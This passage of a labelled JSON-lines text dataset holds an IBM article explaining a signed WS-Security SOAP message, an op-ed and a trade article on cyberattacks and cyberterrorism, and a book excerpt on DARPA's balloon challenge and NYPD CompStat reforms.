xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"> 2. <soapenv:Header> 3. <wsse:Security soapenv:actor=\"http://www.jStartcustomer.com/actors#verifier\" soapenv:mustUnderstand=\"1\" xmlns:wsse=\"http://schemas.xmlsoap.org/ws/2002/04/secext\"> <Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"> 4. <SignedInfo> 5. <CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> 6. <SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/> 7. <Reference URI=\"#sign_content_1043176028580\"> 8. <Transforms> 9. <Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> 10. </Transforms> 11. <DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/> 12. <DigestValue>FLuQTa/LqDIZ5F2JSaMRHSRuaiQ=</DigestValue> 13. </Reference> 14. </SignedInfo> 15. <SignatureValue> 16. kGlrrXjKku/WXKxID+JJkEXY+aGNYHc5dy8GwbLFtB5Msll2/MhwdnO9wastJ0gLPzLy3oHL 17. 7A8ggkMkjgAqnLg6PTzM7MdKoIAhe+xRHdOysamGucFJQRMrU+JQ4WATJt0bpdClwJy6mexT 18. Su48mq1q5rM9YZh61P7UEUKt+EQ= 19. </SignatureValue> 20. <KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"> 21. <KeyValue> 22. <RSAKeyValue> 23. <Modulus> 24. 2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8ARepOA1ABFK2OMy 25. pzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGpFIRH 26. 18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492k= 27. </Modulus> 28. <Exponent>AQAB</Exponent> 29. </RSAKeyValue> 30. </KeyValue> 31. <X509Data> 32. <X509IssuerSerial> 33. <X509IssuerName>OU=Java,O=IBM,L=Unknown,ST=Oklahoma,C=US</X509IssuerName> 34. <X509SerialNumber>0</X509SerialNumber></X509IssuerSerial> 35. <X509SubjectName>CN=John Doe</X509SubjectName> 36. <X509Certificate> 37. MIIB0TCCAToCAQAwDQYJKoZIhvcNAQEEBQAwTzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCE9rbGFo 38. b21hMRAwDgYDVQQHEwdVbmsam3duMQwwCgYDVQQKEwNJQk0xDTALBgNVBAsTBEphdmEwHhcNMDIw 39. OTI1MTAxMTQ4WhcNMDMwOTI1MTAxMTQ4WjATMREwDwYDVQQDEwhKb2huIERvZTCBnzANBgkqhkiG 40. 9w0BAQEFAAOBjQAwgYkCgYEA2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8A 41. RepOA1ABFK2OMypzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGp 42. FIRH18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492kCAwEAATANBgkqhkiG9w0BAQQFAAOBgQCs 43. OD02WMoYcMR7Sqdb9oQyk7Nn4rQ5DBgZ5mxGGVzWxBZW/QON+Ir2j4KUjX1jalMvbHa9lnhPQmJi 44. Ued923rza7fvdRG2CDalbW0R3aPd5q0u3akP0/Ejb7z5o88heajCSgfRruvU+ZdOTT3Oe+RBQgw8 45. VuzbLApPnXiehowYuA== 46. </X509Certificate> 47. </X509Data> 48. </KeyInfo> 49. </Signature> 50. </wsse:Security> 51. </soapenv:Header> 52. <soapenv:Body> 53. application specific data/content 54. </soapenv:Body> 55. </soapenv:Envelope>:\nLet's look at the SOAP message in greater detail. As you can plainly see, this is a typical SOAP message with an outermost opening and closing\n<soapenv:Envelope> tag set. The SOAP envelope contains\n<soapenv:Body> sections. The WS-Security section, as defined by the WS-Security specification, is positioned within the SOAP Header and is designated by the opening and closing\n<wsse:Security> block, lines 3-51. The\n<Security> header block provides a mechanism for attaching security-related information targeted at a specific receiver (the SOAP actor). Since only one SOAP actor is involved in this use case, only one\n<Security> header block is contained in the message.\nIn line 3, the SOAP actor attribute defines the recipient of a header entry,\nSecurity soapenv:actor=\"http://www.jStartcustomer.com/actors#verifier\". Line 3 also contains the\nsoapenv:mustUnderstand=\"1\" attribute. By setting the SOAP mustUnderstand attribute to\n\"1\", we indicate that the service provider must process the SOAP header entry. As per the SOAP specification, since the attribute is set to\n\"1\", if the receiver cannot obey the semantics (as conveyed by the fully qualified name of the element) and process the message according to those semantics, the receiver MUST fail processing the message and generate a fault.\n<SignedInfo> </SignedInfo>, describes the signed content of the message. Note that as is customary with digital signature applications, a digest is used to facilitate faster processing. This is a standard industry practice and is done for performance reasons. The payload (the SOAP Body) of our SOAP message is quite long, and the process of applying a public key algorithm to the full message could significantly impact the performance of our web service. As such, a digest is used. A digest is a fixed length, short message whose digital signature can be quickly generated and verified. When the message is received, our web service digital signature verifier class (implemented as an Apache Axis plugable provider) will compute the digest and verify that the newly-computed digest matches the digest that was sent.\nLet's look at the elements that make up the Signed Content portion of the message. Line 5,\n<CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>, identifies the canonicalization algorithm that is used to create a canonicalized form of the information being signed -- in this case, the digest. This step is needed because of the nature of XML documents and the programming tools that work with them. XML documents, in some cases, can have slight textual differences, yet be essentially the same logical document. Small variations in the way comments are represented or in the way an XML parser handles line delimiters when serializing/deserializing an XML data structure can create slightly different binary representations of the same content. If the algorithm that verifies the digital signature were to be run against a slightly different serialized version of the data, the result could be a fail when indeed it should be a pass.\nTo avoid this problem, the document is first transformed into its canonicalized form through the use of a canonicalization algorithm. This algorithm, an implementation of the W3C Exclusive XML Canonicalization Version 1.0 Specification (see Resources), a W3C recommendation, transforms the document into its basic canonicalized form. This allows us to get a consistent binary representation that can be correctly compared and thus yield the correct result.\n<SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>, indicates the Signature Method Algorithm. This is the algorithm that is used to convert the output of the canonicalization algorithm into the Signature Value. Our signature algorithm is a combination of a key dependent algorithm (RSA) and a hash algorithm (SHA1). This algorithm is an implementation of the RSASSA-PKCS1-v1_5 specification described in W3C RFC 2437 (see Resources).\n<Reference URI=\"#sign_content_1043176028580\">, indicates the reference element. The optional URI attribute of Reference identifies the data object that was signed. The Reference block includes the algorithm that is used to compute the digest, the digest value that was computed, and the final transform that is performed prior to computing the digest value. Lines 8-10,\n<Transforms> <Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> </Transforms>, indicate the transformation algorithm, while lines 11 and 12 specify the digest algorithm and the computed digest value,\nIn our application, the Transform algorithm is once again the W3C Exclusive XML Canonicalization algorithm discussed above. The method used to compute the digest, the Secure Hash Algorithm, is part of the U.S. Department of Commerce/National Institute of Standards and Technology's Secure Hash standard.\n<SignatureValue>kGlrrXjKku/WXKxID+JJkEXY+aGNYHc5dy8GwbLFtB5Msll2/MhwdnO9wastJ0gLPzLy3oHL, contain the signature value, which is actually the encrypted digest value. This value is the output of the Signature Method Algorithm indicated on line 6.\nLines 20-48 introduce the concept of keys. A key is used to mathematically transform a normal, readable text message into an unreadable one for transmission across the internet. Our web service will use a public/private-key (a pair of mathematically related keys) or an asymmetric key encryption scheme. One of these keys is kept secret; this is the private key. In our application, the web service requester will sign the digest with his private key prior to sending the document to the service provider.\nLine 20 begins the Key Value block and identifies the namespace that we will use --\n<KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\">. The Key Value block,\n<KeyValue> <RSAKeyValue> </RSAKeyValue> </KeyValue>, is where the web service requester supplies the web service provider with the information they need in order to obtain the key needed to validate the signature. In our message, the\nKeyValue element contains the requester's public key, which will be used to validate the signature. We have chosen to use an asymmetric RSA (named after the three inventors, Rivest, Shamir, and Adleman) key-based approach in order to meet our non-repudiation requirement.\nThe use of the RSA key scheme assures our web service provider that the message was in the same form that it was received, and it was signed by the owner of the extracted digital certificate. If the recomputed digest matches the decrypted digest from the SOAP message, the service provider is able to verify the integrity of the message. By logging the message before any processing is done (the log is implemented as the first Apache Axis handler in the handler chain), the web service provider can prove that the message in question was sent by whomever signed the message and that it was received unmodified from the form in which is was sent.\nRSAKeyValue elements have two fields:\n<Modulus> 2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8ARepOA1ABFK2OMy pzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGpFIRH 18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492k=</Modulus>\nThe RSA scheme uses large prime numbers to construct the key pairs. The Modulus is the product of two large prime numbers. Each pair shares the Modulus, but each also has a specific exponent. The RSA Laboratories' Frequently Asked Questions About Today's Cryptography, Version 4.1 document (see Resources) describes how the Modulus and the Exponent are created:\n\"Take two large primes, p and q, and compute their product n = pq; n is the modulus. Choose a number, e, less than n and relatively prime to (p - 1)(q - 1), which means that e and (p - 1)(q - 1) have no common factors except 1. Find another number d such that (ed - 1) is divisible by (p - 1)(q - 1). The values e and d are called the public and private exponents, respectively. The public key is the pair (n, e); the private key is (n, d).\"\nThe service requester digitally signs the message with their private key. On the service provider side, the signature is verified using the requester's public key. Since the service requester signs the message with a private, asymmetric key, the service provider is assured that the only organization that could have signed the message is the holder of the private key.\nThe next section of the Key Info block is the digital certificate itself as indicated by the\n<X509Data> element. The digital certificate is used to identify the sender of the message in the way a user ID is used to identify the user of web and enterprise applications. The first element in this block of data identifies the organization that signed the certificate. This is typically the certificate authority. In our case, that information has been replaced with generic information:\nNext is the\n<X509SubjectName>CN=John Doe</X509SubjectName> element, which contains the distinguished name of the service requester -- in our case, simply John Doe -- and finally the X.509 certificate itself:\n<X509Certificate> MIIB0TCCAToCAQAwDQYJKoZIhvcNAQEEBQAwTzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCE9rbGFo b21hMRAwDgYDVQQHEwdVbmsam3duMQwwCgYDVQQKEwNJQk0xDTALBgNVBAsTBEphdmEwHhcNMDIw OTI1MTAxMTQ4WhcNMDMwOTI1MTAxMTQ4WjATMREwDwYDVQQDEwhKb2huIERvZTCBnzANBgkqhkiG 9w0BAQEFAAOBjQAwgYkCgYEA2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8A RepOA1ABFK2OMypzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGp FIRH18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492kCAwEAATANBgkqhkiG9w0BAQQFAAOBgQCs OD02WMoYcMR7Sqdb9oQyk7Nn4rQ5DBgZ5mxGGVzWxBZW/QON+Ir2j4KUjX1jalMvbHa9lnhPQmJi Ued923rza7fvdRG2CDalbW0R3aPd5q0u3akP0/Ejb7z5o88heajCSgfRruvU+ZdOTT3Oe+RBQgw8 VuzbLApPnXiehowYuA== </X509Certificate>\nThe final stage of WS-Security processing is to validate the web service requester's digital certificate. When using a digital certificate approach, each web service requester must have a digital certificate which a trusted Certificate Authority (CA) has signed. The definition of a trusted certificate authority is outside the scope of this paper, but typically either an industry-accepted, 3rd-party certificate authority (a company like VeriSign) performs this role, or the web service provider takes on the role of the certificate authority for the certificates that their application uses. If the latter approach is used, use of the open source OpenSSL toolkit from Apache, or the basic digital certificate support provided by WebSphere Application Server's IKEYMAN utility is recommended.\nIn the initial rollout of our application, our customer chose to play the role of certificate authority. As such, they created their own, self-signed CA certificate. Prior to any web service interactions, the web service requester must provide the web service provider with a certificate that they will use in the application. Playing the certificate authority role, the web service provider signs the certificate and returns it to the web service requester.\nAs described above, the web service requester includes the CA-signed digital certificate in the SOAP message. After the digital signature has verified the integrity of the message, the certificate is extracted from the message and validated using the CA's public key. Once the validity of the certificate has been achieved, the web service requester will have been authenticated and the processing of the WS-Security portion of the message will be complete. The owner has successfully authenticated to the receiver.\nNote that if, at a later date, our service provider chooses to relinquish the role of the certificate authority and use an industry-accepted, trusted, 3rd-party certificate authority, the logic of our validation code does not need to change. In this scenario, prior to using the web service, the web service requester will need to get a certificate issued by a trusted certificate authority. The service requester will place this 3rd-party certificate in the SOAP message. When the service provider is validating the digital certificate, instead of using their self-signed CA key, the public key of the 3rd-party CA will be used. In this scenario, the service provider has established a trust relationship with the 3rd-party certificate authority, and the CA will be trusted to adequately authenticate users before issuing certificates to them.\nOne of the promises of web services is to be able to loosely couple the end points and allow the publishing of services in UDDI directories that can be discovered and invoked dynamically at run time. Unfortunately, at this point in the technology life cycle, the use of WS-Security in the SOAP message header prevents us from being able to do this. Today's Java to WSDL emitters are not yet able to handle the creation of WSDL documents that appropriately describe the WS-Security requirements. Plus, even if they could, at this stage, development tools such as WebSphere Studio Application Developer or Visual Studio .Net couldn't generate the proxies that handle the WS-Security aspects of the service.\nAs such, the developers of web services in early 2003 will need to make a conscious trade-off here. When WS-Security is used, the service provider needs to either provide stubs/proxies which partners can invoke that handle the WS-Security portion of the message or manually communicate the WS-Security requirement of the Web service to their potential business partners and customers. For the WS-Security-based project described in this paper, proxies that properly sign the message and insert the WS-Security element into the SOAP data stream were created for Java technology, COM, and .Net clients. The next generation of Web services development tools from IBM and others should be able to handle the WS-Security elements of a Web service, but for now, developers need to understand that this is an achievable, but manual process.\nThis paper described an Internet-based web services application that was developed and deployed in 2002. It was deployed on a WebSphere Application Server and is available for use by our customer's business partners. It demonstrates the soundness and overall viability of the draft WS-Security specification by offering itself as a proof-point that secure, mission critical, web services applications are viable with today's development tools and deployment platforms. Yes, in our customer's case, some non-automated, manual steps were required to handle the WS-Security element of our SOAP message, but as support for WS-Security gets folded into the next iteration of the WSDL specification and support is added to the web services development tools of many vendors, it will only get better.\n- Find the W3C Exclusive XML Canonicalization Version 1.0 Specification from the W3C web site.\n- Find the W3C XML Signature Syntax and Processing Proposed Recommendation Specification from the W3C web site.\n- Find the RFC 2437 (PKCS1) from the W3C web site.\n- Download the Secure Hash Standard (PDF) from the Department of Commerce/National Institute of Standards and Technology.\n- Browse through the RSA Laboratories' Frequently Asked Questions About Today's Cryptography, Version 4.1, Year: 2000.\n- Find more information about the IBM jStart Program.\n- You can find the Draft WS-Security Specification V1.0 on the developerWorks web services zone (5 April 2002).\nSam Thompson joined IBM in 1980 and held various technical and management positions in VM product development. In 1992, Sam moved to the systems management development lab in Raleigh, North Carolina and helped bring several SystemView products to market. When SystemView merged with Tivoli Systems, Sam traveled the world as a technical evangelist explaining the merger, the new Tivoli strategy and products, and the convergence strategy for the IBM and Tivoli workgroup products. In March 1997 he assumed his present position in IBM's Emerging Technologies jStart (jump start) group and works with organizations to help them build solutions that utilize IBM XML, Java, and Web services technologies. You can reach Sam at thompsam at us.ibm.com.", "label": 1}
{"text": "Cyberattacks: A call for collaborative action\nWe need to develop a collective consciousness for coping with the growing menace of cyber attacks, says Stanton Sloane.\nNews of cyber security attacks is becoming all too familiar. Recent reports propose how to combat sophisticated, custom-created malware designed to penetrate government and private industry computer networks, and steal national security secrets. This has raised overall awareness of the problem, but not as much attention has been placed on a key business concern: the theft of commercial intellectual property. We need to develop a collective consciousness for coping with the growing menace of cyber attacks, particularly given the economic and safety issues triggered when valuable intellectual property is the target. That's why advocating a public-private industry collaboration makes the most sense. The isolated efforts of individual nations, industry groups, or companies will be ineffective against 21st century intellectual property crime. This is a bigger problem. A few examples illustrate the point:\n- According to the Office of the United States Trade Representative (USTR), intellectual property theft costs American corporations $250 billion every year. Among those affected are manufacturers, distributors, retailers, employees, artists, consumers, and governments.\n- The costs of intellectual property theft are not solely economic; the public's health and safety is also affected. For instance, intellectual property thieves can make huge profits from selling cheap counterfeit versions of products, not only where safety and reliability are essential, but also when brand recognition is key to consumer confidence and loyalty. One example: counterfeit airplane parts played a role in at least 166 U.S.-based accidents or mishaps during a recent 20-year period.\n- United States Customs and Border Protection estimates that 750,000 American jobs have been lost due to counterfeiting.\n- The U.S. Chamber of Commerce Global Intellectual Property Center estimates that intellectual property in the United States is worth between $5 trillion and $5.5 trillion. It accounts for approximately half of U.S. exports with roughly 40 percent driving U.S. economic growth. The impact of intellectual property theft on the U.S. economy is irrefutable.\n- Research from the non-profit U.S. Cyber Consequences Unit indicates that the destruction from a single wave of cyber attacks on critical infrastructure could exceed $700 billion, or the equivalent of 50 major hurricanes hitting U.S. soil at once.\nBeyond the economic impacts, theft of intellectual property provides a significant advantage in learning curve for the thief. My hypothetical example would be the time involved in developing manufacturing techniques to produce advanced jet engine components. Theft of the processes, techniques, and tools required to produce these components instantly provides the thief with years of experience, and quickly levels the competitive landscape.\nThis is not a new problem. But when we move from the realm of music “pirates” or theft of soft drink formulations into organized, state-led thefts of critical technologies, the threat to national security increases exponentially, even though it is not a direct attack on our defense networks.\nThere is no simple solution to this problem. The first step, however, must be recognition of the scale and scope of the problem. It is underestimated today. Given the impact an average hacker can create with a simple virus, you can appreciate what a well-financed foreign government-sponsored intelligence organization can do to penetrate a commercial company's network and extract critical intellectual information. Simple virus detection software is not an adequate defense against that type of threat. It is a complex system engineering problem, one which requires a collective government-industry collaboration to counter.\nThere also needs to be consequences for nations that conduct these activities, or who fail to pursue and prosecute criminals operating within their borders. Granted, that is a hard problem to solve in an age of globalization where international relations are very sensitive, but the alternative is an accelerating shift of technology and financial power out of this country. While current political rhetoric makes us feel good about increasing the country's investment in research and technology, it is pointless to do so if it is just going to be pirated by our foreign adversaries. We are simply saving them the time and money of doing it themselves.\nThe time for action is now. A “Cyber Pearl Harbor” is in reality an “Economic Pearl Harbor.” The only difference is that the enemy has quietly opened all the underwater valves on the ships, instead of dropping torpedoes.\nDr. Stanton Sloane was appointed president and CEO of SRA International in April 2007.", "label": 1}
{"text": "For the last year or so, business managers have been pounded with the rallying cry to protect their data and controls from possible cyber crime. Now, several Information Technology experts are asking the question: Has the threat of cyberterrorism been overstated?\nAt the recent CeBIT show, a panel of IT experts concluded that it has. The general consensus was that a bomb would strike more terror into a people or country than a temporary shutdown of the Internet. The Internet is great for communication, and terrorists are probably using it for such purposes. But the idea that a shutdown of the Internet would frighten people, in the U.S. for example, into widespread panic has less credibility, said the experts.\nAccording to the panel, which included executives from software security vendors and representatives from NATO, most critical systems don’t run on the Internet. They run on secure networks, making it far less likely that terrorist hackers would get in. (If you’re like most businesses, you too have an independent site that accesses the Internet, but doesn’t completely and solely rely on it.)\nOne reason for all the focus on the possibility of cyberterrorism, claimed those experts, is that the U.S. government wanted a broader front to use in its attack on terrorism. Companies and others willingly jumped on that bandwagon, touting the benefits of making sure your controls and systems are secure and safe.\nThis is not to say that cyber attacks won’t happen. Recent news reports show that communication and computer attacks are happening.\nFor example, Al-Jazeera, the Arab satellite television network, experienced denial of service attacks shortly after it showed U.S. solders held as POWs by Iraq, and for a few weeks afterward. The attacks pretty much shut down the network during the last few weeks of this past March.\nIn another high-profile example, the Web site for 10 Downing Street also experienced problems; it was hacked by antiwar protesters.\nWhile the risk of a catastrophic cyber terrorist attack may be more realistically viewed as low, that doesn’t mean we shouldn’t protect our controls and systems. After all, the threat of viruses and worms continues. According to a survey conducted by ICSA Labs, a division of TruSecure Corp., the number of virus attacks is down, but the ones that occur are more virulent. The survey analyzed incidents reported on more than 900,000 desktop computers, servers and gateways. Based on the analysis, for every 1,000 machines operating, there are about 113 virus attacks a month. That number is not an indication that the problem is going away. The ICSA Labs noted that it takes about 23 staff days to clean up systems after an attack, at an average cost of about $81,000.\nThe next areas you may want to secure and protect are your domain name and dot-com servers. And experts are thinking that the next attacks from hackers will involve forgery and identity theft more than denial of service or viruses.\nTherefore, while we will probably not face many of the more exaggerated scenarios of business catastrophe due to cyber crime, there are worthwhile reasons to protect your controls and systems. The good news is that you have some breathing space. Make sure your firewalls are properly configured and that you routinely install patches and fixes as software vendors announce them, That will go a long way toward preventing a cyber attack. As budgets permit, you can install more rugged and secure solutions.\nBut there is more good news on the cyber crime front. Colleges and universities are finally taking steps to teach future programmers how to write secure code and detect hacking. Microsoft Corporation is helping with this endeavor. The company is working with a number of universities to develop programming curriculua that teach students the skills necessary to handle these issues. In some of the courses, students will be asked to hack into code, (which in a slightly warped way could mean that we are training future hackers). Nonetheless, it’s a good idea to train programmers in how to deal with these problems. By the way, these university programs will cover a range of software code, not just Microsoft code.\nOn the whole, industry’s efforts to fight cyber crime make good news. Leslie Langnau, senior technical editor email@example.com", "label": 1}
{"text": "The Case for Collaboration\nTHE HUNT FOR TEN RED BALLOONS\nOn October 29, 2009, the Defense Advanced Research Projects Agency (DARPA) announced its \"Network Challenge.\" At 10:00 a.m. on December 5, 2009, at ten locations throughout the United States, DARPA would let fly an eight-foot-diameter red weather balloon tethered to the ground. Each balloon would be readily visible from local roads and buildings--points the average person could reach. A $40,000 prize would go to the first team to accurately report the location of all ten weather balloons.\nThe contest was meant to replicate the challenge of trying to gather information about an adversary in an open environment. DARPA wanted to test whether ordinary folks using commonly available off-the-shelf technology and social media like Twitter or Facebook could work together--collaborate--to solve a problem that would be, in the words of one expert from the National Geospatial-Intelligence Agency, \"impossible to solve by traditional intelligence gathering methods.\"\nA team from MIT's Media Lab won. No surprise there. MIT had a slew of faculty and top graduate students, the most sophisticated equipment, and great publicity. CNN profiled them and drew attention to their cause. A Georgia Tech team placed second, for similar reasons.\nBoth teams competed fiercely. They put out misinformation, reporting false sightings, sent others on wild-goose chases, and bought time for themselves. Both teams wrote complex computer programs to defend themselves against such attacks.\nGiven their advantages, you would expect MIT and Georgia Tech to come out ahead--and they did, with a winning time under nine hours.\nBut what is interesting is the guy who finished in a tie for third with eight balloons, and actually led the pack for the first four hours of the competition--nineteen-year-old hacker George Hotz. Hotz heard about the contest only a couple of days before, and only an hour before it started he put up a website called Dudeitsaballoon.com.\nHow did he do it? His idea was based on a kind of mass collaboration.\nHotz had nearly fifty thousand followers on Twitter. They, in turn, had hundreds of thousands of followers. His plan was to mobilize them all--get thousands in the game and all those eyeballs searching for the prized red balloons. It almost worked.\nHotz was already famous in the hacker community for \"jailbreaking\" the Sony PlayStation and the Apple iPhone. He'd cracked their proprietary codes, and for the iPhone wrote software that let iPhone owners use it on any wireless network, not just AT&T's--much to AT&T's and Apple's chagrin and the hacker community's glee.\nThese legendary hacks made Hotz a star. He gained tens of thousands of Twitter followers, all of whom wanted to be the first to know what George Hotz might do next. On Twitter, they would soon find out.\nOn the day before the DARPA contest, Hotz--who went by his Twitter name, @geohot--tweeted his followers to stand by for a major announcement the next day. That started a buzz going in the Twitterverse and on hacker bulletin boards.\nOn Saturday morning @geohot tweeted his fifty thousand followers:\n10AM EST today marks the start of a US wide scavenger hunt, for 10 red balloons http://bit.ly/7chum5 #dudeitsaballoon\nHe quickly followed up with another tweet:\nSo I need your help to do two things, 1, find big red balloons, and 2, RT [retweet] and trend this !!!! http://bit.ly/7chum5 #dudeitsaballoon\nHe included a link to his website. The hashtagged #dudeitsaballoon guaranteed that if his message got retweeted, as requested, #dudeitsaballoon would rise to the top of the Twitter trending terms. That would amplify its effect--and call further attention to Hotz's cause.\nVisitors clicking through to Hotz's website found the following message:\nRight now you are all probably waking up to another normal Saturday. But this Saturday is not normal. In addition to planes, birds, owls, and everything else in the sky, there are 10 red balloons scattered around the United States. Starting at 10AM EST, your US government is using tax dollars to send 10 big red weather balloons into the sky. I need to know the location of those balloons.\nSo if you see a big red balloon in the sky, about 8ft round, numbered 1 to 10 . . . report it here ASAP so I can win the contest.\nHotz offered $1,000 to anyone who gave him a confirmed sighting. And he offered something that would incite any die-hard hacker.\n\"Seriously,\" Hotz wrote. \"If you guys come through for me . . . I'll make you an untethered jailbreak.\"\nOffering an untethered jailbreak to the hacker community was like dangling red meat in front of a lion. It was the gold standard of all hacks. Unlike Hotz's earlier iPhone hack, which left the iPhone tethered to software you had to run each time you started the phone, this time Hotz was promising to hack the iPhone again and create an untethered jailbreak. Untethered, you could use your phone just like any cell phone, on any carrier. Untethered, the iPhone would be released from its earthly moorings. It would be hacker heaven.\nWord raced around hacker online sites and bulletin boards that George Hotz was offering to do an untethered jailbreak for spotting the red balloons. We have to win this, the hacker community buzzed. Do it for @geohot; do it for us!\nBy hour four, Hotz had four verified sightings--more than the MIT team and the Georgia Tech team. He traded two of his four sightings with one of the other front-running teams. That made six.\nEventually, the MIT and Georgia Tech teams surged ahead, but not before Hotz found eight of the ten balloons. He had done better than dozens of teams competing. It was far more than what traditional intelligence gathering could accomplish.\nMore than that, it showed DARPA the raw power of the Internet to foster collaboration. What George Hotz lacked in funding, institutional support, and educational credentials he made up for with digital age assets: networks of followers who, on an otherwise ordinary Saturday and with a promise of glory and gifts, he could get in the game fast. Already arrayed on trusted platforms, Hotz sent current through those networks, turned followers into partisans, and got them collaborating--in minutes. Together, they pulled off something extraordinary (and nearly won the Challenge).\nRESTORING AN EMPIRE STATE OF MIND\nBILL BRATTON Takes New York\nAs the commissioner of the New York City Police Department and the Boston Police Department, and chief of the Los Angeles Police Department, I learned about the power of collaboration across departments, agencies, and private industry early on.\nIn 1993, an army of squeegee people seemed to have taken over New York. At every corner and tunnel entrance in the city, you'd stop for a light and they would pounce, some filthy rag or sponge coming up to your windshield, a face and hand close behind. You could try to wave them off. Or you could try to ignore them, eyes straight ahead. Not always practical. It was sort of a mini-street corner protection racket, with the convenient charade of a spit-enhanced wipe down and a key scratch across your car's paint job if you didn't pay them for the \"cleaning.\"\nIn 1993, the election for New York City mayor was on. US Attorney Rudy Giuliani was running against Mayor David Dinkins, crime, disorder--and squeegee people. You could almost make a compound noun of those terms, lumping them all together, and many voters did. The news stories were incessant, fueling what every New Yorker sensed anyway, whether they commuted by car, foot, or subway: the city was out of control.\nTen percent of New Yorkers experienced violent crime in a year. But every day 100 percent experienced the city's disorder: fare beaters and drunks on the subways, mental patients off their meds wandering the streets, prostitution operating out in the open. Long lines, high taxes, poor service. Broken neighborhoods, broken people, broken windows--a broken city.\nIt all fueled a sense of chaos. The New York Post summed it up for the incumbent, Mayor Dinkins: \"Dave, Do Something!\"\nToo late for his mayoralty, Dinkins raised money for six thousand more cops. Too often, NYPD commissioner Ray Kelly's cops scattered the squeegee people only to see them rally to some other corner moments later.\nWhen the dust of the November elections settled, the voters had replaced Dinkins with Giuliani; the new mayor soon replaced Kelly with me as NYPD commissioner. I had been the commissioner of the Boston Police Department and before that, in 1991, chief of the New York City Transit Police Department.\nGiuliani had made a campaign promise to get rid of the squeegee guys, so I knew I needed to move quickly, continuing the work Kelly had begun. Counting heads, it turned out that the \"army\" of squeegee men had actually numbered about seventy-five. Well before the Internet, the blogosphere, or the Twitterverse, New York's potent tabloids had turned seventy-five sponge-and-bucket guys into a national symbol of impotent government and a city on the brink.\nPersistent police work paid off. Many of the men had had prior problems with the law and couldn't afford to get arrested again. Which is exactly what we promised, and did. We stayed around long enough to break up this thriving little extortion racket that was driving the city crazy. Seemingly overnight the squeegee men were gone--though we did have in our favor thirty-eight thousand cops versus seventy-five squeegee pests.\nThe tactics I used to conquer that problem formed the strategy of what I hoped would be a much more ambitious effort, one aimed not just at cutting crime but at dramatically changing the quality of life in New York.\nThe NYPD had people bluffed, as I later wrote in my first book looking back at the time. They had the reputation as the greatest crime-fighting machine in the history of policing, but to me the big blue wall was a lot of blue smoke and a few mirrors.\nThey were good at responding to crime, they just weren't very good at preventing it. They weren't even trying to prevent it. They were just cleaning up around it.\nThe NYPD, like many departments, was \"all response, all the time.\" The 911 dispatch system created in the 1970s had democratized policing: it was no longer \"who you knew downtown.\" Now, any citizen could mobilize the department with a free call from a pay phone. And millions did. Police were racing across the city from call to call.\nBut the 911 system didn't dent crime much--the onslaught of crack, disorder, and guns in the 1980s and '90s saw to that. A single citizen could make hundreds--even thousands--of calls complaining about nuisance gangs, drugs, and prostitutes on the same corner. Officers responded every time, but nothing changed. It was like shoveling sand against the tide--the tide kept coming back.\nRemember the precinct house nicknames of the time--\"Fort Apache, the Bronx\" or \"Little House on the Prairie\"? That's what American policing had become: isolated outposts, controlling little outside its four walls--or outside the cruiser. The 911 dispatch kept cops in cars, windows rolled up, AC blasting, racing to calls or on \"random\" patrol in between, intending to deter crime by their mere presence.\nAs New York City's police commissioner, I quickly set out to establish a new form of policing, one that required collaboration not only between all areas of the department, but also with other agencies and the public. My goal was to transform the city and the American police profession.\nIt all starts with a vision, I told the department: as good as we are, we can do better. But we can't do it alone.\nThe path forward--the new platform for policing New York--came to be known as CompStat.\n\"When have you guys ever addressed crime?\" Jack Maple, my right hand at the New York Transit Police Department and now at the NYPD, was digging in. John Timoney, a twenty-five-year NYPD veteran and now my chief of department, had called Maple out for his comment to a reporter. \"Those guys over there at the NYPD have given up on crime fighting,\" Maple had said.\nTimoney pointed to this operation and that, and cited his stellar service as commander of New York's 5th Precinct on the Lower East Side. Maple would have none of it. \"Your Narcotics Bureau works nine to five, Monday through Friday. The Warrant squad is off weekends. Auto crimes, off weekends. Robbery squad, off weekends. The whole place takes weekends and nights--just when the criminal element gets down to work.\"\nAnd that was the problem.\nTo transform the city, I knew, my team and I would have to start with the NYPD. To succeed, I needed believers and doers. I screened the incoming command staff and promoted my own leaders over the heads of others--Timoney among them, and Louis Anemone, who would be chief of patrol. My inner staff was made up of longtime NYPD partisans--but commanders who were loyal to me, who understood and bought into my vision: the NYPD could do better, and this was the way.\nMaple had been through this before with me when years earlier I reorganized the New York Transit Police Department. Metropolitan Transit Authority president David Gunn had told me at the time that fare beating was bleeding the MTA dry; disorder was shrinking ridership. There was brand-new capital waiting to be poured into rebuilding the subways--but the subways were out of control. He needed them tamed.\nI concentrated patrols where the problem was highest, and ran high-visibility mass arrests. We were able to bring fare beating on the 